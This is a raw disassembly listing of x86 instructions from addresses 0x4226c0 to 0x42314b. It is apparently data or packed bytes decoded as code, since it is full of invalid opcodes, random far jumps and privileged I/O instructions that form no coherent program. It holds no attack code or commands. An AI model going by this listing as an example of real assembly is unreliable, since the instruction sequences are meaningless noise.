  4226c0:	bound  esi,QWORD PTR ds:0x6c44e4eb
  4226c6:	out    0xc7,al
  4226c8:	mov    WORD PTR [esi+0x614669fe],?
  4226ce:	mov    bh,0x9a
  4226d0:	mov    al,0xc3
  4226d2:	shr    DWORD PTR [edx+0xa],0x72
  4226d6:	gs pop ebp
  4226d8:	sti    
  4226d9:	outs   dx,DWORD PTR ds:[esi]
  4226da:	or     eax,0xe14e176e
  4226df:	cmp    bh,al
  4226e1:	jno    0x42274d
  4226e3:	fmul   DWORD PTR [esi-0x36dc34bf]
  4226e9:	or     eax,DWORD PTR [edi+0x39]
  4226ec:	pop    eax
  4226ed:	or     eax,0x8b261ffc
  4226f2:	add    al,0xac
  4226f4:	jbe    0x4226ce
  4226f6:	mov    BYTE PTR [edx+esi*4-0x2405bda7],0x2a
  4226fe:	mov    DWORD PTR [ebx],edi
  422700:	mov    bl,0xfe
  422702:	xchg   ecx,eax
  422703:	(bad)  
  422704:	in     al,dx
  422705:	xchg   esi,eax
  422706:	jno    0x422771
  422708:	cld    
  422709:	push   ecx
  42270a:	retf   0xf4b0
  42270d:	icebp  
  42270e:	and    bl,BYTE PTR [eax+0x1daf439c]
  422714:	out    dx,eax
  422715:	cmc    
  422716:	dec    esp
  422717:	or     DWORD PTR [edx-0x1b0f63eb],edx
  42271d:	xor    DWORD PTR [edi-0x4bb0738d],ebx
  422723:	aas    
  422724:	aad    0x1e
  422726:	outs   dx,DWORD PTR ds:[esi]
  422727:	mov    edx,DWORD PTR [edx]
  422729:	jmp    0x5d35ba7f
  42272e:	mov    eax,ebx
  422730:	sbb    ebp,eax
  422732:	or     al,0x58
  422734:	inc    ebx
  422735:	cld    
  422736:	fdecstp 
  422738:	xchg   edx,eax
  422739:	ss test eax,0xb87f237d
  42273f:	(bad)  
  422740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422741:	dec    ebp
	...
  4227b2:	add    BYTE PTR [eax],al
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	shl    BYTE PTR [ecx-0x36],0xcd
  4227c4:	loop   0x422836
  4227c6:	add    DWORD PTR [eax],eax
  4227c8:	test   BYTE PTR [eax],0x0
  4227cb:	add    BYTE PTR [eax-0x2cc23405],ch
  4227d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d2:	or     BYTE PTR [esi+0x57],dl
  4227d5:	pop    es
  4227d6:	pop    ss
  4227d7:	mov    ds:0x6eded92a,eax
  4227dc:	in     al,dx
  4227dd:	leave  
  4227de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227df:	or     BYTE PTR [esi+esi*1-0xfdc54e8],dl
  4227e6:	sub    al,0xb1
  4227e8:	outs   dx,DWORD PTR ds:[esi]
  4227e9:	adc    al,dl
  4227eb:	div    BYTE PTR [edi]
  4227ed:	mov    dl,0xde
  4227ef:	adc    eax,0x9ab4ae68
  4227f4:	fst    QWORD PTR [ecx-0x37fc3970]
  4227fa:	mov    WORD PTR [edx],fs
  4227fc:	push   es
  4227fd:	jmp    0x4227af
  4227ff:	fstp   st(6)
  422801:	les    ebp,FWORD PTR [ebp+0x42a2c596]
  422807:	pop    es
  422808:	(bad)  
  422809:	(bad)  
  42280a:	shl    BYTE PTR fs:[eax],1
  42280d:	fdiv   DWORD PTR [eax+0xaa59047]
  422813:	popf   
  422814:	loope  0x4227e8
  422816:	adc    esi,ebx
  422818:	jnp    0x4227ab
  42281a:	(bad)  
  42281b:	loopne 0x4227de
  42281d:	ret    0xa9a4
  422820:	xchg   ebx,eax
  422821:	dec    edx
  422822:	mov    dh,0xd5
  422824:	mov    ds,WORD PTR [esi]
  422826:	in     al,dx
  422827:	xor    BYTE PTR [edi-0x1608c947],dl
  42282d:	aad    0xe4
  42282f:	dec    ecx
  422830:	dec    ebp
  422831:	sbb    cl,BYTE PTR [ebx]
  422833:	pop    ebx
  422834:	fdivrp st(1),st
  422836:	sub    al,0x77
  422838:	mov    dh,0x54
  42283a:	jnp    0x42289f
  42283c:	push   cs
  42283d:	mov    edi,esi
  42283f:	and    BYTE PTR [edx+0x2cddb528],dh
  422845:	mov    dl,0xd8
  422847:	adc    esi,DWORD PTR [edx-0x2]
  42284a:	pop    ebp
  42284b:	inc    edi
  42284c:	scas   al,BYTE PTR es:[edi]
  42284d:	(bad)  
  42284f:	or     al,0xec
  422851:	fs dec ebx
  422853:	pushf  
  422854:	int    0x23
  422856:	adc    ebp,DWORD PTR [ecx+0x3478e7e6]
  42285c:	jb     0x4228a1
  42285e:	xchg   BYTE PTR [esi+0x1d2b907d],bh
  422864:	inc    edi
  422865:	stos   BYTE PTR es:[edi],al
  422866:	mov    eax,es
  422868:	lahf   
  422869:	popa   
  42286a:	fadd   st,st(3)
  42286c:	mov    WORD PTR [ecx-0x60480e02],?
  422872:	gs ret 0x7e81
  422876:	pop    ebx
  422877:	lods   eax,DWORD PTR ds:[esi]
  422878:	adc    BYTE PTR [edx+0x55750d3a],0xbb
  42287f:	mov    ebx,0xa8a82324
  422884:	into   
  422885:	ret    
  422886:	(bad)  
  422887:	pop    edi
  422888:	mov    esi,0x2fe23119
  42288d:	ds cdq 
  42288f:	popf   
  422890:	mov    ebp,0x3d24463d
  422895:	adc    bh,BYTE PTR [edi]
  422897:	pop    ebx
  422898:	cmp    al,0x48
  42289a:	ret    
  42289b:	(bad)  [edx+0x56]
  42289e:	fisttp DWORD PTR [eax]
  4228a0:	xchg   BYTE PTR [ecx-0x60],bh
  4228a3:	scas   eax,DWORD PTR es:[edi]
  4228a4:	int3   
  4228a5:	xor    esi,eax
  4228a7:	outs   dx,DWORD PTR ds:[esi]
  4228a8:	pop    edi
  4228a9:	ds jns 0x422880
  4228ac:	jmp    ecx
  4228ae:	mov    ah,0x33
  4228b0:	mov    dh,0x7d
  4228b2:	mov    ds:0x13b46690,al
  4228b7:	int3   
  4228b8:	aaa    
  4228b9:	pop    ss
  4228ba:	fmul   DWORD PTR [ebx+0x6f]
  4228bd:	inc    esp
  4228bf:	cmp    ch,al
  4228c1:	jnp    0x4228c3
	...
  422933:	add    dh,bh
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	adc    ebp,ebp
  422942:	mov    eax,ds:0x171d8dd
  422947:	add    dh,dh
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [esi+edi*2+0x61],dl
  42294f:	adc    bl,BYTE PTR [edx-0x42]
  422952:	mov    edx,0xdd79bb8e
  422957:	mov    bl,0x4f
  422959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42295a:	loope  0x42292d
  42295c:	out    dx,eax
  42295d:	push   ebx
  42295e:	mov    DWORD PTR [esi-0x70731e6f],ecx
  422964:	jno    0x4229a7
  422966:	outs   dx,BYTE PTR ds:[esi]
  422967:	cmp    eax,0x4145c246
  42296c:	loop   0x422938
  42296e:	icebp  
  42296f:	stos   BYTE PTR es:[edi],al
  422970:	ja     0x4229bf
  422972:	aas    
  422973:	cmp    edx,DWORD PTR [ecx]
  422975:	sub    eax,0xad6ffece
  42297a:	mov    edi,0x542a068a
  42297f:	mov    bl,0xc7
  422981:	(bad)  
  422982:	fsubr  QWORD PTR [edi+0x20]
  422985:	in     al,0xe0
  422987:	mov    edi,0x7e963537
  42298c:	pushf  
  42298d:	repz xor al,0xb1
  422990:	cmp    ecx,ebx
  422992:	mov    ch,0xf5
  422994:	addr16 loope 0x4229c2
  422997:	xor    al,0x8a
  422999:	adc    edi,DWORD PTR [eax-0x799fbb0a]
  42299f:	shl    BYTE PTR [edx],0x56
  4229a2:	mov    bh,0x3b
  4229a4:	dec    edi
  4229a5:	fcmovnbe st,st(6)
  4229a7:	scas   eax,DWORD PTR es:[edi]
  4229a8:	ror    DWORD PTR [ebx-0x58cdc838],cl
  4229ae:	scas   eax,DWORD PTR es:[edi]
  4229af:	das    
  4229b0:	jbe    0x422a2c
  4229b2:	aad    0x8f
  4229b4:	sbb    eax,0xf5cb7bb9
  4229b9:	mov    al,ds:0xa518c844
  4229be:	mov    ebx,0x3e46c324
  4229c3:	hlt    
  4229c4:	mov    bh,0x16
  4229c6:	pop    ds
  4229c7:	stos   BYTE PTR es:[edi],al
  4229c8:	sbb    BYTE PTR [edx+ebp*8-0x6f5aa592],ah
  4229cf:	or     BYTE PTR [edx-0x3af7d4d2],0x4c
  4229d6:	aam    0x28
  4229d8:	inc    edx
  4229d9:	and    edx,DWORD PTR [eax+0x23768a23]
  4229df:	xchg   esi,eax
  4229e0:	pop    esi
  4229e1:	scas   al,BYTE PTR es:[edi]
  4229e2:	mov    al,ds:0x3210795b
  4229e7:	ja     0x422a01
  4229e9:	mov    bl,0xc9
  4229eb:	in     al,dx
  4229ec:	xor    BYTE PTR [edx],ch
  4229ee:	out    dx,eax
  4229ef:	xchg   edi,eax
  4229f0:	retf   0x9315
  4229f3:	lods   eax,DWORD PTR ds:[esi]
  4229f4:	shl    DWORD PTR [esp+edi*8],1
  4229f7:	aad    0xdc
  4229f9:	add    esi,ebx
  4229fb:	mov    ecx,0xf31ad8f7
  422a00:	xor    bl,BYTE PTR [ebx+0x70467ac]
  422a06:	std    
  422a07:	shl    BYTE PTR [edx-0x25],0x61
  422a0b:	lods   al,BYTE PTR ds:[esi]
  422a0c:	loopne 0x422a54
  422a0e:	and    al,0x7
  422a10:	fisub  DWORD PTR [ebx+eax*1+0xab4346a]
  422a17:	push   ebx
  422a18:	push   0xffffff98
  422a1a:	jns    0x422a0b
  422a1c:	ror    al,cl
  422a1e:	adc    al,0xe9
  422a20:	sahf   
  422a21:	mov    edx,0x296d6dc2
  422a26:	mov    esp,0xd59efb91
  422a2b:	scas   al,BYTE PTR es:[edi]
  422a2c:	out    dx,eax
  422a2d:	outs   dx,BYTE PTR ds:[esi]
  422a2e:	gs xchg esp,eax
  422a30:	sti    
  422a31:	add    cl,BYTE PTR [esp+eax*4+0x5732c4b7]
  422a38:	pop    ebp
  422a39:	nop
  422a3a:	cwde   
  422a3b:	sti    
  422a3c:	jbe    0x422a2b
  422a3e:	mov    edx,0xaf0a66
	...
  422ab3:	add    BYTE PTR [esi],dl
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	fwait
  422ac1:	lea    esp,[ecx]
  422ac3:	cmp    esi,ecx
  422ac5:	jb     0x422ac8
  422ac7:	add    dh,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    cl,al
  422acd:	hlt    
  422ace:	inc    edi
  422acf:	sub    al,0x91
  422ad1:	lock daa 
  422ad3:	aaa    
  422ad4:	mov    ebp,0x8a9d7bba
  422ad9:	rcr    BYTE PTR [ecx],cl
  422adb:	add    eax,0xd58cf270
  422ae0:	xor    al,0x29
  422ae2:	jmp    eax
  422ae4:	sub    eax,0xb1139c1
  422ae9:	jb     0x422b26
  422aeb:	pop    eax
  422aec:	aam    0x6
  422aee:	mov    esi,0xe77c3946
  422af3:	mov    ch,0xb0
  422af5:	(bad)  [esi-0x70dab31a]
  422afb:	jno    0x422af8
  422afd:	pop    edx
  422afe:	ins    DWORD PTR es:[edi],dx
  422aff:	and    esp,DWORD PTR [ebx]
  422b01:	pop    ebp
  422b02:	adc    eax,edi
  422b04:	(bad)  
  422b05:	in     eax,0xef
  422b07:	std    
  422b08:	mov    eax,ds:0xd02f759a
  422b0d:	enter  0x20b8,0x8e
  422b11:	rol    DWORD PTR ds:0x26f80ba4,cl
  422b17:	jno    0x422b98
  422b19:	jl     0x422aa0
  422b1b:	sti    
  422b1c:	in     al,0x12
  422b1e:	and    edi,ebp
  422b20:	jae    0x422b59
  422b22:	ins    BYTE PTR es:[edi],dx
  422b23:	xor    al,0x2e
  422b25:	xchg   edx,eax
  422b26:	xor    ch,al
  422b28:	xor    ah,BYTE PTR [esi-0x5c74cd98]
  422b2e:	cmp    edx,DWORD PTR [edi-0x5b]
  422b31:	loopne 0x422af5
  422b33:	js     0x422b86
  422b35:	or     eax,0xba820b11
  422b3a:	push   ds
  422b3b:	std    
  422b3c:	mov    ds:0x70f6ed1c,eax
  422b41:	pop    esp
  422b42:	pusha  
  422b43:	test   DWORD PTR [edx],eax
  422b45:	cdq    
  422b46:	imul   esp,edi,0xb0fac5cb
  422b4c:	out    dx,al
  422b4d:	fs icebp 
  422b4f:	jl     0x422b3a
  422b51:	and    eax,0x51d75cee
  422b56:	jmp    0x7cb7:0x495f0a
  422b5d:	loope  0x422b75
  422b5f:	loopne 0x422b66
  422b61:	push   0xffffffd6
  422b63:	ss push edx
  422b65:	mov    ss,ecx
  422b67:	stos   DWORD PTR es:[edi],eax
  422b68:	mov    ds:0x1a2e88ad,al
  422b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b6e:	push   ebp
  422b6f:	stos   BYTE PTR es:[edi],al
  422b70:	jle    0x422b82
  422b72:	push   0x9
  422b74:	fwait
  422b75:	inc    edx
  422b76:	sub    dh,BYTE PTR [ebp+0x75319bb7]
  422b7c:	popf   
  422b7d:	out    dx,eax
  422b7e:	les    esp,FWORD PTR [edx+0x39]
  422b81:	mov    al,0x53
  422b83:	pushf  
  422b84:	dec    edx
  422b85:	sbb    al,0x27
  422b87:	pop    edx
  422b88:	xchg   ebx,eax
  422b89:	cmc    
  422b8a:	jo     0x422b95
  422b8c:	sbb    eax,0xb4643586
  422b91:	mov    edx,0x918dab73
  422b96:	jecxz  0x422b37
  422b98:	inc    esp
  422b99:	or     dh,dl
  422b9b:	addr16 fsub st(6),st
  422b9e:	fild   WORD PTR [edx]
  422ba0:	xchg   ecx,eax
  422ba1:	cs in  al,0x98
  422ba4:	inc    eax
  422ba5:	push   esp
  422ba6:	fisttp QWORD PTR [eax]
  422ba8:	adc    al,0x5c
  422baa:	jp     0x422bb0
  422bac:	dec    edi
  422bad:	and    dl,BYTE PTR [eax-0x571486fc]
  422bb3:	leave  
  422bb4:	push   edx
  422bb5:	pop    edi
  422bb6:	gs idiv esp
  422bb9:	mov    ds:0xdfa29a1a,eax
  422bbe:	push   ebx
  422bbf:	jle    0x422bba
  422bc1:	sahf   
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	jle    0x422c4f
  422c42:	inc    eax
  422c43:	(bad)  
  422c44:	les    esi,FWORD PTR [ebx+0x1]
  422c47:	add    dh,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ecx],bh
  422c4d:	jns    0x422c3d
  422c4f:	inc    esp
  422c50:	sub    al,0x40
  422c52:	retf   
  422c53:	dec    DWORD PTR [esi-0x3758f8d2]
  422c59:	add    edi,DWORD PTR [ebx]
  422c5b:	mov    DWORD PTR [edx-0x79],edi
  422c5e:	test   BYTE PTR ds:0xd4c2f47f,bl
  422c64:	out    dx,al
  422c65:	mov    DWORD PTR [ecx+ecx*1+0x0],ebx
  422c69:	(bad)  
  422c6a:	repz into 
  422c6c:	rcr    DWORD PTR [edi+eax*2+0x59],1
  422c70:	sbb    al,0x75
  422c72:	in     al,0x31
  422c74:	xor    esi,DWORD PTR [ebp+0x3a]
  422c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c78:	fmul   DWORD PTR [ebx+0x5f]
  422c7b:	mov    al,ds:0xea80ead6
  422c80:	or     ebp,esp
  422c82:	gs xchg esp,eax
  422c84:	add    DWORD PTR [esi-0x10],eax
  422c87:	pusha  
  422c88:	or     al,0xa9
  422c8a:	pop    eax
  422c8b:	outs   dx,BYTE PTR ds:[esi]
  422c8c:	xchg   ecx,eax
  422c8d:	leave  
  422c8e:	sub    DWORD PTR [edi+0x113552e4],ecx
  422c94:	stc    
  422c95:	lea    esi,[eax-0x10db70cd]
  422c9b:	and    al,0xf7
  422c9d:	dec    DWORD PTR [ebp+0x6d]
  422ca0:	sub    eax,DWORD PTR [eax+0x4b]
  422ca3:	ret    
  422ca4:	addr16 push cs
  422ca6:	pop    ebp
  422ca7:	xchg   ecx,eax
  422ca8:	(bad)  
  422ca9:	sub    BYTE PTR [edx+0x1],dh
  422cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cad:	and    BYTE PTR [eax+eiz*8],0xe7
  422cb1:	fsubr  DWORD PTR [edx+ebp*8]
  422cb4:	xchg   ebx,eax
  422cb5:	pop    es
  422cb6:	push   ecx
  422cb7:	cmp    al,0x43
  422cb9:	lds    ebp,FWORD PTR [esi]
  422cbb:	das    
  422cbc:	mov    ds,esi
  422cbe:	sub    BYTE PTR [eax+edi*4],0x98
  422cc2:	scas   eax,DWORD PTR es:[edi]
  422cc3:	fdiv   st(5),st
  422cc5:	inc    esi
  422cc6:	adc    ebp,DWORD PTR [eax]
  422cc8:	leave  
  422cc9:	mov    ds:0x428a499b,eax
  422cce:	sub    eax,0x44c7512b
  422cd3:	(bad)  
  422cd4:	jbe    0x422cab
  422cd6:	(bad)  
  422cd7:	adc    BYTE PTR [esi+0xa],bh
  422cda:	cwde   
  422cdb:	xor    eax,DWORD PTR [edx]
  422cdd:	or     eax,0xd286a09b
  422ce2:	(bad)  
  422ce3:	sbb    dh,BYTE PTR [ecx+0x9]
  422ce6:	sub    ch,cl
  422ce8:	cdq    
  422ce9:	mov    bl,0xab
  422ceb:	jnp    0x422c7e
  422ced:	aad    0x2
  422cef:	and    dh,ch
  422cf1:	mov    esp,0xbb5e651e
  422cf6:	pop    esp
  422cf7:	cmp    BYTE PTR [ecx+0x14],cl
  422cfa:	pop    ds
  422cfb:	ret    0x2bf9
  422cfe:	repnz pop esi
  422d00:	jmp    0x422d29
  422d02:	jae    0x422c8a
  422d04:	cld    
  422d05:	sbb    bl,bl
  422d07:	les    esp,FWORD PTR [esi+edx*8]
  422d0a:	loope  0x422cb9
  422d0c:	loop   0x422cfb
  422d0e:	test   BYTE PTR [edi-0x74faab37],al
  422d14:	vpmacssdqh ymm5,ymm7,ymm7,YMMWORD PTR [ecx]
  422d1a:	leave  
  422d1b:	out    dx,eax
  422d1c:	inc    edi
  422d1d:	sbb    BYTE PTR [edi],ah
  422d1f:	add    BYTE PTR [edi-0x89735a9],al
  422d25:	cld    
  422d26:	inc    edx
  422d27:	cli    
  422d28:	sub    eax,0x1c0ec5df
  422d2d:	pop    eax
  422d2e:	loope  0x422d26
  422d30:	lea    eax,[ebp-0x1777d9f2]
  422d36:	xor    DWORD PTR [esi-0x3537d125],ebx
  422d3c:	sbb    BYTE PTR [ecx-0x2169882f],0x0
	...
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0xeec5f9f7
  422dc2:	jae    0x422d53
  422dc4:	mov    edx,0xf6000174
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [esi-0x2736f2f2],dh
  422dd1:	dec    edi
  422dd2:	mov    ds:0xccc94584,al
  422dd7:	mov    bh,0xcd
  422dd9:	jns    0x422d73
  422ddb:	mov    edx,0xd7dd54ca
  422de0:	popf   
  422de1:	(bad)  
  422de2:	sbb    eax,0x7d1b35db
  422de7:	leave  
  422de8:	sbb    eax,0xa2fc9f99
  422ded:	shl    BYTE PTR [ebx+0x60],0x34
  422df1:	pop    esi
  422df2:	in     al,0x82
  422df4:	xor    ah,BYTE PTR [esi]
  422df6:	mov    eax,ds:0x84deff49
  422dfb:	xlat   BYTE PTR ds:[ebx]
  422dfc:	aam    0x47
  422dfe:	pop    edi
  422dff:	mov    al,ds:0xfc87998d
  422e04:	test   DWORD PTR [edx-0x15],0x5bcbc09a
  422e0b:	dec    edi
  422e0c:	imul   ebx,DWORD PTR [eax-0x7c],0x68
  422e10:	repz enter 0xd257,0x26
  422e15:	jo     0x422da7
  422e17:	(bad)  
  422e18:	fnstcw WORD PTR [edx]
  422e1a:	shl    BYTE PTR [edx+0x3ba97a9],0xe2
  422e21:	inc    esi
  422e22:	mov    ds:0x266824d2,al
  422e27:	xor    al,0x7c
  422e29:	outs   dx,BYTE PTR ds:[esi]
  422e2a:	stos   BYTE PTR es:[edi],al
  422e2b:	push   esp
  422e2c:	pcmpeqw mm2,QWORD PTR [edi]
  422e2f:	test   esp,edi
  422e31:	test   BYTE PTR [ebx],dh
  422e33:	pop    esp
  422e34:	inc    ebx
  422e35:	pop    esi
  422e36:	push   edx
  422e37:	pushf  
  422e38:	(bad)  
  422e39:	push   ebx
  422e3a:	or     DWORD PTR [edi+0x18],ebp
  422e3d:	inc    eax
  422e3e:	add    eax,0x72e4cde
  422e43:	clc    
  422e44:	in     al,0x34
  422e46:	dec    edx
  422e47:	(bad)  
  422e48:	cli    
  422e49:	popf   
  422e4a:	or     DWORD PTR [ecx],0xdc62d090
  422e50:	mov    edi,0xdcceb1a8
  422e55:	dec    esp
  422e56:	int3   
  422e57:	in     eax,0xaa
  422e59:	bound  edx,QWORD PTR [esi+0x57f5cb5c]
  422e5f:	repnz sub al,0x93
  422e62:	xlat   BYTE PTR ds:[ebx]
  422e63:	out    0x87,eax
  422e65:	leave  
  422e66:	(bad)  
  422e67:	in     al,dx
  422e68:	mov    dl,0xeb
  422e6a:	ins    DWORD PTR es:[edi],dx
  422e6b:	mov    edi,0x58c2613b
  422e70:	in     al,0x5
  422e72:	dec    esi
  422e73:	mov    ah,BYTE PTR [edx]
  422e75:	add    eax,0x33116a71
  422e7a:	popa   
  422e7b:	mov    ebp,0xa1d413a2
  422e80:	inc    ebx
  422e81:	lahf   
  422e82:	dec    eax
  422e83:	fisttp DWORD PTR [ebx]
  422e85:	les    eax,FWORD PTR [eax]
  422e87:	xchg   ebp,eax
  422e88:	pop    edx
  422e89:	fmul   QWORD PTR [esi-0x23]
  422e8c:	(bad)  
  422e8d:	in     eax,dx
  422e8e:	pop    esi
  422e8f:	xor    ebx,DWORD PTR [edx]
  422e91:	jmp    0x422ed2
  422e93:	dec    ebp
  422e94:	and    DWORD PTR [ecx+0x63],ebp
  422e97:	fwait
  422e98:	mov    fs,WORD PTR [edx+ebx*1-0x59]
  422e9c:	xor    al,0xc9
  422e9e:	ret    
  422e9f:	xor    al,BYTE PTR [ecx-0x79f2abed]
  422ea5:	jmp    0x422eda
  422ea7:	push   cs
  422ea8:	lods   al,BYTE PTR ds:[esi]
  422ea9:	retf   0x1d56
  422eac:	and    esi,eax
  422eae:	dec    edx
  422eaf:	into   
  422eb0:	mov    ah,0xa
  422eb2:	xchg   esi,eax
  422eb3:	fwait
  422eb4:	mov    ah,0x2e
  422eb6:	mov    BYTE PTR [ebx+0x7eb08a8c],ch
  422ebc:	retf   
  422ebd:	adc    DWORD PTR [eax],esi
  422ebf:	popa   
  422ec0:	and    DWORD PTR [esi+0x0],0x0
	...
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    dh,BYTE PTR fs:0x1edc
  422f43:	mov    eax,ds:0x175b0
  422f48:	test   BYTE PTR [eax],0x0
  422f4b:	add    al,dh
  422f4d:	dec    esp
  422f4e:	pop    es
  422f4f:	adc    ah,BYTE PTR [eax*4-0x711b9e90]
  422f56:	mov    dh,0xb5
  422f59:	call   0x35ef:0x46161276
  422f60:	iret   
  422f61:	outs   dx,BYTE PTR ds:[esi]
  422f62:	dec    esi
  422f63:	fld    TBYTE PTR [ecx+0x6ab02c49]
  422f69:	jmp    0x46dc7ee6
  422f6e:	lock xchg DWORD PTR [ebp-0x796ef538],edi
  422f75:	out    dx,al
  422f76:	push   cs
  422f77:	sbb    DWORD PTR [edx-0x9ebe13c],edi
  422f7d:	jp     0x422f43
  422f7f:	sbb    ch,bl
  422f81:	adc    al,0x15
  422f83:	test   DWORD PTR [ebp-0x51],esi
  422f86:	arpl   WORD PTR [eax],di
  422f88:	dec    esi
  422f89:	push   esp
  422f8a:	out    dx,al
  422f8b:	arpl   WORD PTR [ecx-0x3eac7165],bp
  422f91:	std    
  422f92:	or     DWORD PTR [eax],edi
  422f94:	sub    al,0xb3
  422f96:	iret   
  422f97:	xor    eax,0xa3536a2c
  422f9c:	dec    edi
  422f9d:	jle    0x422f3e
  422f9f:	aas    
  422fa0:	mov    bh,0x3e
  422fa2:	loopne 0x422fed
  422fa4:	add    dh,ah
  422fa6:	xchg   BYTE PTR [ecx-0x72],ah
  422fa9:	pop    esp
  422faa:	push   ebp
  422fab:	fadd   DWORD PTR [ebx+0x2f53fb61]
  422fb1:	cwde   
  422fb2:	mov    edx,0x788911d8
  422fb7:	xlat   BYTE PTR ds:[ebx]
  422fb8:	xchg   ebp,eax
  422fb9:	jmp    0x423011
  422fbb:	adc    ah,ch
  422fbd:	sbb    DWORD PTR [esi-0x473bf14b],esp
  422fc3:	jns    0x423037
  422fc5:	sub    ah,BYTE PTR [eax-0x2f]
  422fc8:	pop    eax
  422fc9:	cmp    DWORD PTR [ebx+esi*1-0x49f00509],0xffffffff
  422fd1:	pop    eax
  422fd2:	sahf   
  422fd3:	dec    ebx
  422fd4:	imul   eax,DWORD PTR [edi],0xffffffcb
  422fd7:	adc    BYTE PTR [ecx],ch
  422fd9:	ins    BYTE PTR es:[edi],dx
  422fda:	inc    edi
  422fdb:	and    eax,0x21aacdb6
  422fe0:	pop    eax
  422fe1:	and    ah,BYTE PTR [ebx-0x490e42c2]
  422fe7:	mov    DWORD PTR [edx+0x62a61536],edi
  422fed:	xchg   ebp,eax
  422fee:	popa   
  422fef:	mov    bh,0x15
  422ff1:	sbb    eax,0xedad5d0c
  422ff6:	pop    ebp
  422ff7:	xchg   ah,dl
  422ff9:	mov    cl,0x9
  422ffb:	mov    cs,WORD PTR [edi+0x68]
  422ffe:	aad    0x7d
  423000:	cmp    al,0xe9
  423002:	jo     0x422fcf
  423004:	je     0x422fb5
  423006:	pop    ebx
  423007:	dec    eax
  423008:	push   0x657ec91f
  42300d:	cs cld 
  42300f:	dec    ebp
  423010:	stos   BYTE PTR es:[edi],al
  423011:	gs xchg ebx,eax
  423013:	mov    esi,0xa652e101
  423018:	ret    
  423019:	pop    eax
  42301a:	es daa 
  42301c:	ret    
  42301d:	push   ebx
  42301e:	loope  0x422fa5
  423020:	pop    eax
  423021:	mov    ds:0x45058372,al
  423026:	dec    ecx
  423027:	ins    DWORD PTR es:[edi],dx
  423028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423029:	push   ds
  42302a:	pop    esp
  42302b:	repnz bound edi,QWORD PTR [edi+0x2e]
  42302f:	arpl   WORD PTR [edx-0x4849f7a2],di
  423035:	int    0x19
  423037:	pop    ecx
  423038:	fnstcw WORD PTR [ebx+eax*4-0x42]
  42303c:	clc    
  42303d:	ins    BYTE PTR es:[edi],dx
  42303e:	sub    BYTE PTR [edi],bl
  423040:	pusha  
  423041:	inc    edi
	...
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b5:	push   edx
  4230b6:	jnp    0x4230b5
  4230b8:	(bad)  
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	push   edx
  4230c1:	jle    0x423129
  4230c3:	mov    al,0xa6
  4230c5:	jbe    0x4230c8
  4230c7:	add    dh,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [ebp-0x669dbf68],ch
  4230d1:	das    
  4230d2:	imul   ebx,esi,0x1e
  4230d5:	add    eax,edx
  4230d7:	rcl    ebp,1
  4230d9:	cdq    
  4230da:	hlt    
  4230db:	xor    ch,cl
  4230dd:	outs   dx,BYTE PTR ds:[esi]
  4230de:	js     0x42308a
  4230e0:	jns    0x423158
  4230e2:	mov    es:0xefc35a39,al
  4230e8:	jl     0x4230d4
  4230ea:	dec    ebx
  4230eb:	add    al,0xec
  4230ed:	outs   dx,BYTE PTR fs:[esi]
  4230ef:	xor    eax,0x5553c059
  4230f4:	fnsave [esi-0x3ad8ddf]
  4230fa:	push   ecx
  4230fb:	addr16 retf 
  4230fd:	daa    
  4230fe:	sbb    eax,0xdd17d127
  423103:	jle    0x423160
  423105:	push   ss
  423106:	icebp  
  423107:	das    
  423108:	xchg   ecx,eax
  423109:	or     al,BYTE PTR [ebp+0x24094893]
  42310f:	shl    eax,1
  423111:	jp     0x4230a1
  423113:	inc    eax
  423114:	xor    eax,0x2ccc1bcf
  423119:	push   ebx
  42311a:	or     eax,0xa8c9ef8d
  42311f:	mov    ss,ecx
  423121:	cmp    esi,DWORD PTR [ebx]
  423123:	mov    bl,0xf1
  423125:	cmc    
  423126:	mov    eax,ds:0xdcd229ac
  42312b:	and    DWORD PTR [bx],edx
  42312e:	test   DWORD PTR [eax-0x520b68f0],eax
  423134:	or     ah,al
  423136:	shl    BYTE PTR [ebx],0x4d
  423139:	in     al,dx
  42313a:	xchg   esi,eax
  42313b:	repz sbb DWORD PTR [eax+0x68d1694d],edx
  423142:	xchg   ebp,eax
  423143:	push   0xa1aa1ae1
  423148:	xchg   DWORD PTR [eax+0x46],ebx
  42314b:	sub    BYTE PTR [eax-0x3694b913],dh
